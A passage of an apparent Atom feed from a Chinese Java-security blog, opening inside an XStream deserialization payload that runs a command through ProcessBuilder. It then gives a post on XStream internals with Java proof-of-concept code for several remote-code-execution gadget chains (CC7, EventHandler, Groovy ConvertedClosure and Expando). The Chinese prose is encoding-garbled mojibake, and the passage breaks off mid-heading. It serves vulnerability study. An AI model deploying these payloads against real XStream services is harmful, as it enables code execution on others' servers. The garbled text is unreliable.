class&amp;#x3D;&amp;quot;javax.imageio.spi.FilterIterator&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;iter class&amp;#x3D;&amp;quot;java.util.Collections$EmptyIterator&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;next class&amp;#x3D;&amp;quot;java.lang.ProcessBuilder&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;command class&amp;#x3D;&amp;quot;java.util.Arrays$ArrayList&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &amp;lt;a class&amp;#x3D;&amp;quot;string-array&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                          &amp;lt;string&amp;gt;open&amp;lt;&amp;#x2F;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                          &amp;lt;string&amp;gt;-a&amp;lt;&amp;#x2F;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                          &amp;lt;string&amp;gt;calculator.app&amp;lt;&amp;#x2F;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &amp;lt;&amp;#x2F;a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;&amp;#x2F;command&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;redirectErrorStream&amp;gt;false&amp;lt;&amp;#x2F;redirectErrorStream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;&amp;#x2F;next&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;&amp;#x2F;iter&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;filter class&amp;#x3D;&amp;quot;javax.imageio.ImageIO$ContainsFilter&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;method&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;class&amp;gt;java.lang.ProcessBuilder&amp;lt;&amp;#x2F;class&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;name&amp;gt;start&amp;lt;&amp;#x2F;name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;parameter-types&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;&amp;#x2F;method&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;name&amp;gt;foo&amp;lt;&amp;#x2F;name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;&amp;#x2F;filter&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;next class&amp;#x3D;&amp;quot;string&amp;quot;&amp;gt;foo&amp;lt;&amp;#x2F;next&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;&amp;#x2F;serviceIterator&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;lock&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;&amp;#x2F;cipher&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;input class&amp;#x3D;&amp;quot;java.lang.ProcessBuilder$NullInputStream&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;ibuffer&amp;gt;&amp;lt;&amp;#x2F;ibuffer&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;done&amp;gt;false&amp;lt;&amp;#x2F;done&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;ostart&amp;gt;0&amp;lt;&amp;#x2F;ostart&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;ofinish&amp;gt;0&amp;lt;&amp;#x2F;ofinish&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;closed&amp;gt;false&amp;lt;&amp;#x2F;closed&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;&amp;#x2F;is&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;consumed&amp;gt;false&amp;lt;&amp;#x2F;consumed&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;lt;&amp;#x2F;dataSource&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;lt;transferFlavors&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;&amp;#x2F;dataHandler&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;dataLen&amp;gt;0&amp;lt;&amp;#x2F;dataLen&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;lt;&amp;#x2F;value&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString reference&amp;#x3D;&amp;quot;..&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;&amp;#x2F;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString reference&amp;#x3D;&amp;quot;..&amp;#x2F;..&amp;#x2F;entry&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString reference&amp;#x3D;&amp;quot;..&amp;#x2F;..&amp;#x2F;entry&amp;#x2F;jdk.nashorn.internal.objects.NativeString&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;&amp;#x2F;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&amp;#x2F;map&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´åˆ†æ" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="XStream" scheme="http://m0d9.me/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>XStreamååºåˆ—åŒ–è¯¦è§£ï¼ˆä¸€ï¼‰</title>
    <link href="http://m0d9.me/2021/05/08/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://m0d9.me/2021/05/08/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-05-08T09:17:00.000Z</published>
    <updated>2021-05-13T07:26:30.081Z</updated>
    
    <content type="html"><![CDATA[<p>XStream ååºåˆ—åŒ–é—®é¢˜ç”±æ¥å·²ä¹…ï¼Œä»&lt;=1.4.6ç‰ˆæœ¬ä¹‹ä¸‹çš„EventHandleråˆ©ç”¨æ–¹å¼ï¼Œåˆ°20å¹´çš„CVE-2020-26217ï¼Œå†åˆ°21å¹´é’Ÿå¸ˆå‚…ã€threedr3amã€whit3p1gå¸ˆå‚…ä»¬ä¸è¦é’±ä¼¼çš„6ä¸ªCVEã€‚å®ƒçš„æˆå› ä¸åŒäºfastjsonä¹‹ç±»ï¼Œä¹Ÿæœ‰å¼‚äºåŸç”ŸJavaååºåˆ—åŒ–ï¼Œå¾ˆæœ‰ç‰¹ç‚¹ï¼Œå€¼å¾—å­¦ä¹ ã€‚</p><p>æœ¬èŠ‚å…¶å®ç®—æ˜¯Wh1t3p1gå¸ˆå‚…ã€Šå›é¡¾XStreamååºåˆ—åŒ–æ¼æ´ã€‹çš„å­¦ä¹ ç¬”è®°ï¼Œä¹Ÿè¯•ç€è§£é‡Šå¸ˆå‚…æ²¡æåˆ°çš„ä¸€äº›ç»†èŠ‚é—®é¢˜ã€‚</p><h2 id="1-XStream-åŸç†è§£æ"><a href="#1-XStream-åŸç†è§£æ" class="headerlink" title="1. XStream åŸç†è§£æ"></a>1. XStream åŸç†è§£æ</h2><h3 id="1-1-æºç è§£æ"><a href="#1-1-æºç è§£æ" class="headerlink" title="1.1 æºç è§£æ"></a>1.1 æºç è§£æ</h3><p>å‚è€ƒã€3ã€‘<br><img src="/images/pasted-136.png" alt="upload successful"></p><a id="more"></a><h4 id="Mapper"><a href="#Mapper" class="headerlink" title="Mapper"></a>Mapper</h4><p>Mapperçš„ä½œç”¨ç±»ä¼¼aliasï¼Œå³å°†å®é™…çš„classä¸xmlå…ƒç´ åç§°å¯¹åº”èµ·æ¥ã€‚ä¾‹å¦‚</p><ul><li>sorted-setå¯¹åº”java.util.SortedSet</li></ul><h5 id="XStream-mapper"><a href="#XStream-mapper" class="headerlink" title="XStream.mapper"></a>XStream.mapper</h5><p>æ˜¯åœ¨<code>XStream.buildMapper()</code>ä¸­è¿›è¡Œåˆå§‹åŒ–</p><p>é€šè¿‡<code>Class type = HierarchicalStreams.readClassType(reader, mapper)</code>è¿›è¡Œè°ƒç”¨ã€‚</p><h4 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a>Converter</h4><p>Converterå­—é¢æ„ä¹‰ä¸ºè½¬æ¢å™¨ï¼Œè´Ÿè´£å¯¹æ¯ä¸ªJava Objectè¿›è¡Œè½¬æ¢ï¼Œæ¯”å¦‚æœ‰<code>IntConverter</code>ã€<code>CharConverter</code>ã€<code>TreeSetConverter</code>ç­‰ç­‰</p><h5 id="xstream-converterLookup"><a href="#xstream-converterLookup" class="headerlink" title="xstream.converterLookup"></a>xstream.converterLookup</h5><p>åœ¨<code>XStream.setupConverters()</code>ä¸­è¿›è¡Œåˆå§‹åŒ–</p><p>é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œè°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># è·å–type ç±»å‹ï¼Œtypeä¸ºclassï¼Œeg java.util.SortdSet</span><br><span class="line">Converter converter = converterLookup.lookupConverterForType(type);</span><br><span class="line"># converter å€¼ä¸ºTreeSetConverter</span><br><span class="line">convert(parent, type, converter);</span><br></pre></td></tr></table></figure><h3 id="1-2-SerializableConverter"><a href="#1-2-SerializableConverter" class="headerlink" title="1.2 SerializableConverter"></a>1.2 SerializableConverter</h3><p>ç®€å•æ¥è®²ï¼Œå¦‚æœclass å®ç°äº†Serializableï¼Œé‚£ä¹ˆå¯¹åº”çš„Converterä¸ºSerializableConverterï¼Œå¦‚æœæ²¡æœ‰ï¼Œé‚£ä¹ˆå°±æ˜¯å…¶ä»–çš„Converterï¼Œä¾å‰æ–‡<code>lookupConverterForType(type)</code>ä¸­çš„typeè€Œå®šã€‚</p><p>å‚è€ƒã€2ã€‘ä¸­æœ‰ç€ä¸€éƒ¨åˆ†çš„ä»£ç åŠè°ƒè¯•ï¼Œä¸èµ˜è¿°</p><h3 id="1-3-CustomObjectInputStream"><a href="#1-3-CustomObjectInputStream" class="headerlink" title="1.3 CustomObjectInputStream"></a>1.3 CustomObjectInputStream</h3><p>éƒ½çŸ¥é“ååºåˆ—åŒ–æ˜¯é€šè¿‡ <code>ObjectInputStream.readObject()</code>å®ç°Inputè½¬Objectçš„ã€‚é’ˆå¯¹å®ç°äº†Serializableæ¥å£çš„ç±»ï¼ŒXStreamä¹Ÿæ˜¯é€šè¿‡è°ƒç”¨readObjectè¿›è¡Œè½¬åŒ–çš„ï¼Œä½†æ˜¯Inputæ˜¯xmlæ ¼å¼çš„ï¼Œå¦‚ä½•åšåˆ°çš„å‘¢ï¼Ÿ</p><p><code>ObjectInputStream.readObject()</code>çš„å®ç°æµç¨‹å¦‚ä¸‹ï¼š<br><img src="/images/pasted-135.png" alt="upload successful"></p><p>å¯ä»¥çœ‹åˆ°Inputä¼šè¢«è§£ææˆä¸€ä¸ªä¸ªç±»ä¼¼TC_OBJECTçš„æ•°æ®ç»“æ„ï¼ŒXstream å¤§è‡´æ¥è¯´æ˜¯é€šè¿‡CustomObjectInputStreamå®ç°è¿™ç§è§£æxmlç»“æ„çš„ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯CustomObjectInputStream.StreamCallback æ¥å£ï¼Œåœ¨ExternalizableConverterå’ŒSerializableConverter æœ‰ä¸åŒçš„å®ç°ï¼Œä»¥SerializableConverterä¸ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CustomObjectInputStream.StreamCallback callback = <span class="keyword">new</span> CustomObjectInputStream.StreamCallback() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">readFromStream</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      reader.moveDown();</span><br><span class="line">      Class type = HierarchicalStreams.readClassType(reader, SerializableConverter.<span class="keyword">this</span>.mapper);</span><br><span class="line">      Object value = context.convertAnother(result, type);</span><br><span class="line">      reader.moveUp();</span><br><span class="line">      <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-ååºåˆ—åŒ–åˆ©ç”¨"><a href="#2-ååºåˆ—åŒ–åˆ©ç”¨" class="headerlink" title="2. ååºåˆ—åŒ–åˆ©ç”¨"></a>2. ååºåˆ—åŒ–åˆ©ç”¨</h2><p>å¼•ç”¨Wh1t3p1gå¸ˆå‚…çš„è§£é‡Š</p><blockquote><p>XStreamååºåˆ—åŒ–åŒfastjsonè¿™ç§ä¸ä¸€æ ·çš„åœ°æ–¹æ˜¯fastjsonä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¸»åŠ¨å»è°ƒç”¨getterså’Œsettersï¼Œè€ŒXStreamçš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­èµ‹å€¼éƒ½ç”±Javaçš„åå°„æœºåˆ¶æ¥å®Œæˆï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰è¿™æ ·ä¸»åŠ¨è°ƒç”¨çš„ç‰¹æ€§ã€‚</p></blockquote><blockquote><p>ä½†æ˜¯è¿˜æœ‰ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼Œå›æƒ³ä¸€ä¸‹ï¼Œåœ¨å‡ æ¡å¸¸è§„çš„javaååºåˆ—åŒ–åˆ©ç”¨é“¾ä¸Šï¼Œéƒ½åˆ©ç”¨äº†HashMapã€PriorityQueueç­‰å¯¹è±¡ï¼ˆkeyä¸å¯é‡å¤ç­‰ç‰¹æ€§ï¼‰ä¼šè‡ªåŠ¨å»è°ƒç”¨hashCodeã€equalã€compareToç­‰è¿™ç§å‡½æ•°ã€‚</p></blockquote><p>è®²çš„å¾ˆæ˜ç™½äº†ï¼Œå¼ºè°ƒä¸€ç‚¹ï¼š<strong>javaååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œç±»å¿…é¡»è¦å¯Serializableï¼Œä½†æ˜¯åœ¨Xstreamä¸Šï¼Œå¹¶ä¸æ˜¯å¿…é¡»</strong>ï¼Œè¿™é‡Œæ˜¯ä¸€åˆ‡åˆ©ç”¨é“¾çš„æ ¹æœ¬åŸå› ã€‚</p><ol><li>åŸJavaååºåˆ—åŒ–é“¾å½“ç„¶å¯ä»¥ç”¨</li><li>å¯»æ‰¾æ–°çš„HashMapã€PriorityQueue</li></ol><h3 id="2-1-åŸJavaååºåˆ—åŒ–é“¾"><a href="#2-1-åŸJavaååºåˆ—åŒ–é“¾" class="headerlink" title="2.1 åŸJavaååºåˆ—åŒ–é“¾"></a>2.1 åŸJavaååºåˆ—åŒ–é“¾</h3><p>è¿™é‡Œè´´ä¸€ä¸‹åŸºäºcc7çš„poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC7</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        Object calc = <span class="keyword">new</span> CommonsCollections7().getObject(<span class="string">&quot;open -a calculator.app&quot;</span>);</span><br><span class="line">        String xml = xStream.toXML(calc);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line"></span><br><span class="line">        Object cc7 = xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-å¯»æ‰¾æ–°çš„HashMapã€PriorityQueueç­‰"><a href="#2-2-å¯»æ‰¾æ–°çš„HashMapã€PriorityQueueç­‰" class="headerlink" title="2.2 å¯»æ‰¾æ–°çš„HashMapã€PriorityQueueç­‰"></a>2.2 å¯»æ‰¾æ–°çš„HashMapã€PriorityQueueç­‰</h3><p>Wh1t3p1gå¸ˆå‚…æ–‡ç« ä¸­è§£é‡Šäº†è¿™ä¸‰ä¸ªç‰¹æ®Šçš„ç±»</p><ol><li>MapConverterï¼Œä¼šè°ƒç”¨hashCode</li><li>TreeSet/TreeMapConverterï¼Œä¼šè°ƒç”¨compareTo</li><li>DynamicProxyConverterï¼Œåˆ›å»ºäº†Proxy instanceï¼ŒInvocationHandlerå¯æ§</li></ol><p>å¸ˆå‚…å·²ç»è®²çš„å¾ˆæ˜ç™½äº†ï¼Œè¿™é‡Œä¹Ÿä¸å¤šè®²ï¼Œç®€å•è§£é‡Š</p><h4 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><h5 id="1-EventHandler"><a href="#1-EventHandler" class="headerlink" title="1. EventHandler"></a>1. EventHandler</h5><p>è¿™é‡Œæ¶‰åŠåˆ°javaåŠ¨æ€ä»£ç†çŸ¥è¯†ï¼Œç”¨åˆ°çš„æ˜¯TreeSetConverter+DynamicProxyConverterï¼ŒpocåŸæ–‡æœ‰ï¼Œå°±ä¸è´´äº†ï¼Œç®€å•è§£é‡Šä¸‹é€»è¾‘å¦‚ä¸‹:</p><ul><li><p>TreeSetConverter å½“æ–°æ’å…¥ä¸€ä¸ªkeyï¼Œä¼šè¿è¡Œkeyçš„compareToæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);</span><br></pre></td></tr></table></figure></li><li><p>DynamicProxyConverter å®ç°ç”Ÿæˆä»£ç†ç±»å®ä¾‹ï¼Œé‡ç‚¹æ˜¯å…¶ä¸­çš„handlerå¯æ§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy = Proxy.newProxyInstance(classLoaderReference.getReference(), interfacesAsArray, handler);</span><br></pre></td></tr></table></figure></li><li><p>EventHandler å°±æ˜¯è¿™æ ·ç†æƒ³çš„å¯æ§InvocationHandlerã€‚EventHandler æœ‰å±æ€§target&amp;actionï¼Œå…¶ä¸­targetä¸ºobjectï¼Œactionä¸ºmethodï¼ŒEventHandler çš„invokeå®ç°ä¸Šçš„é€»è¾‘æœ€ç»ˆä¼šæ‰§è¡Œaction.invoke(target,args)ï¼Œå…¶ä¸­target Demoä¸ºProcessBuilderå¯¹è±¡ï¼Œactionä¸ºstartæ–¹æ³•ï¼Œæœ€ç»ˆå®ç°RCEã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ä¼ªä»£ç </span><br><span class="line"># proxy.compareTo()</span><br><span class="line"># EventHandler è¢«ä»£ç†ç±»ä¼šæ‰§è¡Œ invoke(proxy,&quot;compareTo&quot;,arguments)</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(<span class="keyword">final</span> Object proxy, <span class="keyword">final</span> Method method, <span class="keyword">final</span> Object[] arguments)</span> </span></span><br></pre></td></tr></table></figure></li></ul><p>å…¶å®ç†è§£äº†è¿™ä¸ªçš„é€»è¾‘ï¼Œä¸‹é¢çš„å‡ ä¸ªéƒ½æ¯”è¾ƒç±»ä¼¼äº†</p><p>å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ä¸ªåˆ©ç”¨é“¾çš„é‡ç‚¹æ˜¯EventHandler</p><h5 id="2-Groovy-ConvertedClosure"><a href="#2-Groovy-ConvertedClosure" class="headerlink" title="2. Groovy ConvertedClosure"></a>2. Groovy ConvertedClosure</h5><p>Groovy ConvertedClosure è¿™ä¸ªé“¾å…¶å®å’Œysoserial çš„Groovy1é“¾ç±»ä¼¼ï¼Œåªä¸è¿‡Handleræœ‰ç‚¹ä¸ä¸€æ ·ã€‚è¯¦ç»†åˆ†æå¯ä»¥çœ‹çœ‹Groovyé“¾çš„åˆ†æï¼Œå¸ˆå‚…æ–‡ç« é‡Œæœ‰é“¾æ¥ï¼Œblogé‡Œé¢ä¹Ÿæœ‰è¿™ä¸ªé“¾çš„ç®€å•åˆ†æã€‚</p><h6 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h6><p>Wh1t3p1gå¸ˆå‚…æåˆ°çš„æ˜¯è¿™ä¸ªå§¿åŠ¿å®ç°RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">MethodClosure mc = <span class="keyword">new</span> MethodClosure(runtime, <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">mc.call(<span class="string">&quot;open -a calculator.app&quot;</span>);</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œè¿™æ ·ä¹Ÿå¯ä»¥è§¦å‘ï¼ˆä½†æ˜¯ä¸å¸¦å‚æ•°ï¼Œæš‚æ—¶æ²¡æ‰¾åˆ°å¯ä»¥æ— å‚æ•°çš„åç»­åˆ©ç”¨é“¾ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MethodClosure mc = <span class="keyword">new</span> MethodClosure(<span class="string">&quot;open -a calculator.app&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">mc.call()</span><br></pre></td></tr></table></figure><p>Groovy1é“¾ç”¨çš„å°±æ˜¯è¿™ç§ï¼Œæ°å¥½æ˜¯æ— å‚æ•°çš„è§¦å‘ã€‚</p><h6 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GroovyExpando</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Runtime runtime = Runtime.getRuntime();</span><br><span class="line">    MethodClosure mc = <span class="keyword">new</span> MethodClosure(runtime, <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">    ConvertedClosure handler = <span class="keyword">new</span> ConvertedClosure((Closure) mc, <span class="string">&quot;compareTo&quot;</span>);</span><br><span class="line">    Object map = Proxy.newProxyInstance(</span><br><span class="line">            GroovyConvertedClosure.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Comparable.class&#125;, handler);</span><br><span class="line">    TreeSet ts = PayloadHelper.makeTreeSet(<span class="string">&quot;open -a calculator.app&quot;</span>, map);</span><br><span class="line">    XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">    String xml = xStream.toXML(ts);</span><br><span class="line">    System.out.println(xml);</span><br><span class="line">    </span><br><span class="line">    xStream.fromXML(xml);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-Groovy-Expando"><a href="#3-Groovy-Expando" class="headerlink" title="3. Groovy Expando"></a>3. Groovy Expando</h5><blockquote><p>å‰é¢ç”¨åˆ°äº†TreeSetçš„æ–¹å¼ï¼Œè¿™é‡Œæˆ‘ä»¬å»ä½¿ç”¨Mapçš„ç±»å‹æ¥è§¦å‘ã€‚ä»¥Mapçš„ç±»å‹æ¥è§¦å‘ï¼Œé‚£å°±æ˜¯æ‰¾å¯ä»¥åˆ©ç”¨çš„hashCodeå‡½æ•°</p></blockquote><blockquote><p>groovy.util.Expando#hashCode</p></blockquote><p>å¸ˆå‚…çš„æ€è·¯æ˜¯ä»å¯»æ‰¾hashCodeï¼Œå¾€ä¸Šå›æº¯</p><ol><li>groovy.util.Expando#hashCode æ‰§è¡Œäº†closure.call()ï¼Œå…¶ä¸­closureæ¥æºä¸ºå±æ€§expandoProperties</li><li>TreemapConverter æ¯æ¬¡æ’å…¥objçš„æ—¶å€™ï¼Œéƒ½ä¼šæ‰§è¡Œobj.hashCode</li></ol><p>æ€è·¯å¾ˆç®€å•ï¼Œpocå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GroovyExpando1</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    MethodClosure mc = <span class="keyword">new</span> MethodClosure(<span class="string">&quot;open -a calculator.app&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">    Expando exp = <span class="keyword">new</span> Expando();</span><br><span class="line">    exp.setProperty(<span class="string">&quot;hashCode&quot;</span>,mc);</span><br><span class="line"></span><br><span class="line">    HashMap tp = PayloadHelper.makeMap(<span class="string">&quot;foo&quot;</span>,exp);</span><br><span class="line"></span><br><span class="line">    XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">    String xml = xStream.toXML(tp);</span><br><span class="line">    System.out.println(xml);</span><br><span class="line">    xStream.fromXML(xml);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ç”¨åˆ°çš„æ˜¯MapConveterã€‚</p><h5 id="4-ImageIO-ContainsFilter"><a href="#4-ImageIO-ContainsFilter" class="headerlink" title="4. ImageIO$ContainsFilter"></a>4. 